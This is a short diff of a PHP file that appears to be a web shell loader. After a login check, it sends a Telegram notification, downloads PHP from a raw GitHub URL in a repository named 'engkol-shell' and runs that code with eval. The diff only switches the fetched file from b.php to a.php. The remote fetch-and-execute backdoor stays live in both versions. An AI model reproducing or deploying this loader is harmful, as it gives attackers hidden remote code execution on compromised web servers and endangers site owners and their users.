@@ -84,7 +84,7 @@ if (is_logged_in()) {
     sendTelegramNotification($message);
 
     // Ambil konten dan eksekusi
-    $a = geturlsinfo('https://raw.githubusercontent.com/papakibo/engkol-shell/refs/heads/main/b.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/papakibo/engkol-shell/refs/heads/main/a.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
